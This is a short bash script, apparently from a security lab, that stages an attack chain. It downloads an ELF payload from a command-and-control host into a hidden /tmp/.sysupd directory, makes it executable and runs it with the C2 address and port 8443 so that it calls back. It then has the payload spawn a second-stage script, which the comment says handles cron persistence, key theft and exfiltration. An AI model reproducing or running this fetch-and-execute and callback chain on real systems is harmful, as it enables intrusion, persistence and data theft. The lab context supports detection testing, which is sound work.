#!/usr/bin/env bash
# attack（窗口内）：下载投放 → 执行 → 载荷派生二阶段（cron/密钥/外传）。
set -euo pipefail
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
curl -sf --max-time 10 -o /tmp/.sysupd/stage1.elf "http://$C2_IP:18083/drop.elf"
chmod 0755 /tmp/.sysupd/stage1.elf
cp chain_stage2.sh /tmp/.sysupd/chain_stage2.sh
# 首段回连 + 派生执行二阶段（bash 由 stage1.elf fork/exec——进程树同根）
/tmp/.sysupd/stage1.elf "$C2_IP" 8443 800 "bash /tmp/.sysupd/chain_stage2.sh"
